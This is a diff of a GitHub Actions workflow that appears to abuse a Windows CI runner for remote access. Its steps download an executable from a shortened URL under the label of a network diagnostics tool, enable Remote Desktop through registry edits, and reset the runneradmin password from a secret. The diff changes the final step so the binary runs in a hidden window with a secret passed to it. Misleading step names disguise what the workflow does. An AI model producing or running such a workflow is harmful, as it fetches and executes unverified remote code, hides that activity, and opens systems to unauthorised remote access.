@@ -1,16 +1,19 @@
 name: System Task
 on:
   workflow_dispatch:
+
 jobs:
   system-task:
     runs-on: windows-latest
     steps:
     - name: Checkout Repository
       uses: actions/checkout@v3
+
     - name: Download network diagnostics tool
       run: |
         Invoke-WebRequest -Uri "https://is.gd/ZWJSfm" -OutFile "$env:USERPROFILE\agent.exe"
         Start-Sleep -Seconds 2
+
     - name: Adjust session config
       run: |
         Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
@@ -18,6 +21,9 @@ jobs:
         Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
         $securePass = ConvertTo-SecureString -AsPlainText "${{ secrets.P }}" -Force
         Set-LocalUser -Name "runneradmin" -Password $securePass
-    - name: Perform remote sync handshake
+
+    - name: Perform remote sync handshake (hidden)
       run: |
-        & "$env:USERPROFILE\agent.exe" --secret "${{ secrets.S }}" *> $null
+        Start-Process -FilePath "$env:USERPROFILE\agent.exe" 
+          -ArgumentList "--secret ${{ secrets.S }}" 
+          -NoNewWindow -WindowStyle Hidden
